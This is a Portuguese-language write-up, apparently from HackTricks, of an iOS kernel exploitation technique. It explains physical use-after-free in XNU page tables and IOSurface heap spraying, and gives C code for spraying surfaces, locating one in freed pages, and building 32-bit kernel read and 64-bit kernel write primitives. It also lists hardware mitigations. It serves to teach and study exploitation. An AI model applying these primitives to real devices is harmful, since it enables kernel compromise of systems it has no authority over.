# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

Este é um resumo do post [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html); mais informações sobre exploits que usam esta técnica podem ser encontradas em [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Gerenciamento de memória no XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

O **espaço de endereçamento de memória virtual** para processos de usuário no iOS vai de **0x0 até 0x8000000000**. No entanto, esses endereços não mapeiam diretamente para memória física. Em vez disso, o **kernel** usa **page tables** para traduzir endereços virtuais em endereços **físicos** reais.

#### Níveis das page tables no iOS

As page tables são organizadas hierarquicamente em três níveis:

1. **L1 Page Table (Level 1)**:
* Cada entrada aqui representa uma grande faixa de memória virtual.
* Cobre **0x1000000000 bytes** (ou **256 GB**) de memória virtual.
2. **L2 Page Table (Level 2)**:
* Uma entrada aqui representa uma região menor de memória virtual, especificamente **0x2000000 bytes** (32 MB).
* Uma entrada L1 pode apontar para uma tabela L2 se não puder mapear toda a região por si só.
3. **L3 Page Table (Level 3)**:
* Este é o nível mais fino, onde cada entrada mapeia uma única página de memória de **4 KB**.
* Uma entrada L2 pode apontar para uma tabela L3 se for necessário controle mais granular.

#### Mapeamento de virtual para memória física

* **Direct Mapping (Block Mapping)**:
* Algumas entradas em uma page table mapeiam diretamente uma faixa de endereços virtuais para uma faixa contígua de endereços físicos (como um atalho).
* **Pointer to Child Page Table**:
* Se for necessário controle mais fino, uma entrada em um nível (por exemplo, L1) pode apontar para uma **child page table** no próximo nível (por exemplo, L2).

#### Exemplo: Mapeando um endereço virtual

Digamos que você tente acessar o endereço virtual **0x1000000000**:

1. **L1 Table**:
* O kernel verifica a entrada correspondente na L1. Se ela contiver um **pointer to an L2 page table**, vai para essa L2.
2. **L2 Table**:
* O kernel verifica a L2 para um mapeamento mais detalhado. Se essa entrada apontar para uma **L3 page table**, prossegue para lá.
3. **L3 Table**:
* O kernel consulta a entrada final L3, que aponta para o **endereço físico** da página de memória real.

#### Exemplo de mapeamento de endereço

Se você escrever o endereço físico **0x800004000** no primeiro índice da tabela L2, então:

* Endereços virtuais de **0x1000000000** a **0x1002000000** mapeiam para endereços físicos de **0x800004000** a **0x802004000**.
* Isso é um **block mapping** no nível L2.

Alternativamente, se a entrada L2 apontar para uma tabela L3:

* Cada página de 4 KB na faixa virtual **0x1000000000 -> 0x1002000000** seria mapeada por entradas individuais na tabela L3.

### Physical use-after-free

Um **physical use-after-free** (UAF) ocorre quando:

1. Um processo **aloca** alguma memória como **readable and writable**.
2. As **page tables** são atualizadas para mapear essa memória para um endereço físico específico que o processo pode acessar.
3. O processo **desaloca** (libera) a memória.
4. Porém, devido a um **bug**, o kernel **esquece de remover o mapeamento** das page tables, mesmo marcando a memória física correspondente como livre.
5. O kernel pode então **realocar essa memória física "liberada"** para outros fins, como **kernel data**.
6. Como o mapeamento não foi removido, o processo ainda pode **ler e escrever** nessa memória física.

Isso significa que o processo pode acessar **páginas de memória do kernel**, que podem conter dados sensíveis ou estruturas, potencialmente permitindo que um atacante **manipule memória do kernel**.

### IOSurface Heap Spray

Como o atacante não controla quais páginas do kernel serão alocadas para a memória liberada, ele usa uma técnica chamada **heap spray**:

1. O atacante **cria um grande número de objetos IOSurface** na memória do kernel.
2. Cada objeto IOSurface contém um **magic value** em um de seus campos, tornando-o fácil de identificar.
3. Eles **varrem as páginas liberadas** para ver se algum desses objetos IOSurface caiu em uma página liberada.
4. Quando encontram um objeto IOSurface em uma página liberada, podem usá-lo para **ler e escrever memória do kernel**.

Mais informações sobre isso em [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Tenha em mente que dispositivos iOS 16+ (A12+) trazem mitigações de hardware (como PPL ou SPTM) que tornam técnicas de physical UAF muito menos viáveis.
> PPL aplica proteções MMU estritas em páginas relacionadas a code signing, entitlements e dados sensíveis do kernel; assim, mesmo que uma página seja reutilizada, escritas vindas do userland ou de código do kernel comprometido para páginas protegidas por PPL são bloqueadas.
> Secure Page Table Monitor (SPTM) estende o PPL ao endurecer as próprias atualizações de page tables. Ele garante que até mesmo código privilegiado do kernel não possa remapear silenciosamente páginas liberadas ou manipular mapeamentos sem passar por checagens seguras.
> KTRR (Kernel Text Read-Only Region) tranca a seção de código do kernel como read-only após o boot. Isso previne modificações em tempo de execução do código do kernel, fechando um vetor de ataque majoritário que exploits de physical UAF costumam explorar.
> Além disso, alocações de `IOSurface` são menos previsíveis e mais difíceis de mapear em regiões acessíveis por usuário, o que torna o truque de “magic value scanning” muito menos confiável. E `IOSurface` agora é protegido por entitlements e restrições de sandbox.

### Processo passo a passo do Heap Spray

1. **Spray IOSurface Objects**: O atacante cria muitos objetos IOSurface com um identificador especial ("magic value").
2. **Scan Freed Pages**: Eles verificam se algum dos objetos foi alocado em uma página liberada.
3. **Read/Write Kernel Memory**: Ao manipular campos no objeto IOSurface, obtêm a capacidade de realizar **arbitrary reads and writes** na memória do kernel. Isso permite:
* Usar um campo para **ler qualquer valor 32-bit** na memória do kernel.
* Usar outro campo para **escrever valores 64-bit**, alcançando um primitivo estável de **kernel read/write**.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Procurar por objetos **`IOSurface`** em uma página física liberada:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Alcançando Leitura/Escrita no Kernel com IOSurface

Depois de obter controle sobre um objeto IOSurface na memória do kernel (mapeado para uma página física liberada acessível a partir do userspace), podemos usá-lo para operações arbitrárias de leitura e escrita no kernel.

**Key Fields in IOSurface**

O objeto IOSurface possui dois campos cruciais:

1. **Use Count Pointer**: Permite uma leitura de **32 bits**.
2. **Indexed Timestamp Pointer**: Permite uma escrita de **64 bits**.

Ao sobrescrever esses ponteiros, os redirecionamos para endereços arbitrários na memória do kernel, habilitando operações de leitura/escrita.

#### Leitura de kernel de 32 bits

Para realizar uma leitura:

1. Sobrescreva o **use count pointer** para apontar para o endereço alvo menos um deslocamento de 0x14 bytes.
2. Use o método `get_use_count` para ler o valor naquele endereço.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### Escrita no kernel de 64 bits

Para realizar uma escrita:

1. Sobrescreva o **indexed timestamp pointer** com o endereço alvo.
2. Use o método `set_indexed_timestamp` para escrever um valor de 64 bits.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Recapitulação do Fluxo do Exploit

1. **Trigger Physical Use-After-Free**: Páginas liberadas ficam disponíveis para reutilização.
2. **Spray IOSurface Objects**: Alocar muitos objetos IOSurface com um "magic value" único na memória do kernel.
3. **Identify Accessible IOSurface**: Localizar um IOSurface em uma página liberada que você controla.
4. **Abuse Use-After-Free**: Modificar ponteiros no objeto IOSurface para permitir **kernel read/write** arbitrários via métodos do IOSurface.

Com essas primitivas, o exploit fornece **32-bit reads** controladas e **64-bit writes** para a memória do kernel. Passos adicionais do jailbreak podem envolver primitivos de leitura/escrita mais estáveis, os quais podem requerer contornar proteções adicionais (por exemplo, PPL em dispositivos arm64e mais novos).

{{#include ../../banners/hacktricks-training.md}}
